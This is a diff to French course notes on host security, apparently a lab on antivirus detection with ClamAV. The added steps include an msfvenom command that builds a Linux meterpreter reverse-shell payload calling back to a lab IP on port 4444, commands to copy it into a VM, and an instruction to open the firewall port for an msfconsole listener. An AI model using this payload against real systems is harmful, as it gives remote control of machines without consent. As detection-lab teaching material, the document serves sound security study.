@@ -88,7 +88,7 @@
                     <li><a href="#backup_implementation_type">Backup : Implémentation type</a></li>
                     <li><a href="#backup_exemple_implementation_alternative">Backup : Exemple d'implémentation alternative</a></li>
                     <li><a href="#creation_procedure_backup_mode_push_protege_suppression">Création d'une procédure de backup en mode push, protégé contre la suppression</a></li>
-                    <li><a href="#reference_mecanisme_permettant_implementer_cle_append-only">Référence pour mécanisme permettant d'implémenter une clé append-only.</a></li>
+                    <li><a href="#reference_mecanisme_permettant_implementer_cle_append-only">Référence pour mécanisme permettant d'implémenter une clé append-only</a></li>
                     <li><a href="#reseau_fw_segmentation_detection_prevention_intrusion_environnements_de_travail">Réseau : Pare-feu et segmentation, Détection &amp; prévention d'intrusion : Environnements de travail</a></li>
                     <li><a href="#fw_segmentation_concepts_motivation">Pare-feu et segmentation : Concepts et motivation</a></li>
                     <li><a href="#fw_segmentation_implementation_type">Pare-feu et segmentation : Implémentation type</a></li>
@@ -6728,6 +6728,8 @@ end</code></pre>
                     <p>En résumé, cette commande arrête le service de mise à jour automatique de ClamAV (anti-virus).</p>
 <pre><code>sudo freshclam</code></pre>
                     <p>En résumé, cette commande met à jour manuellement la base de signatures de virus.</p>
+<pre><code>sudo systemctl enable clamav-freshclam --now</code></pre>
+                    <p>En résumé, cette commande dit au système : <q>Active les mises à jour automatiques de l'antivirus et démarre-les maintenant.</q></p>
                     <h4>Création d'un payload de type "reverse shell" :</h4>
                     <p><a href="https://www.hackingarticles.in/msfvenom-tutorials-beginners/" target="_blank">https://www.hackingarticles.in/msfvenom-tutorials-beginners/</a></p>
                     <img src="../images/detection_virus_2.PNG" alt="">
@@ -6735,8 +6737,17 @@ end</code></pre>
 <pre><code>cd ~/Downloads</code></pre>
 <pre><code>msfvenom -p linux/x86/meterpreter/reverse_tcp lhost=172.28.128.1 lport=4444 -f elf &gt; /home/galagao/shell2</code></pre>
                     <p>En résumé, cette commande génère un malware (reverse shell) qui se connecte à ton IP.</p>
-<pre><code>cp ~/shell2 /home/galago/Sync/EPHEC/host-security/vm-provisioning/hard/</code></pre>
+<pre><code>chmod +x shell2</code></pre>
+<pre><code>file shell2</code></pre>
+<pre><code>cp ~/shell2 /home/galago/Sync/EPHEC/host-security/vm-provisioning/hard/scanning/</code></pre>
                     <p>En résumé, cette commande copie le fichier généré vers un autre dossier.</p>
+                    <p>Dans la VM "scanning" ou scanning-sanitized" :</p>
+<pre><code>cd /vagrant</code></pre>
+<pre><code>cp shell2 ~</code></pre>
+<pre><code>cd ~</code></pre>
+                    <p>Sur la machine hôte, il faut que le firewall autorise les connexions entrantes sur le port 4444, utilisé par le payload pour établir la connexion avec la commande suivante :</p>
+<pre><code>sudo ufw allow 4444</code></pre>
+                    <p>Il faut également lancer <span class="em">msfconsole</span> sur la machine hôte et configurer un handler afin d'écouter la connexion entrante du reverse shell.</p>
                     <h4>Configuration de l'écoute dans msfconsole :</h4>
                     <img src="../images/detection_virus_3.PNG" alt="">
                     <p>Voici les différentes commandes exécutées dans l'image précédente :</p>
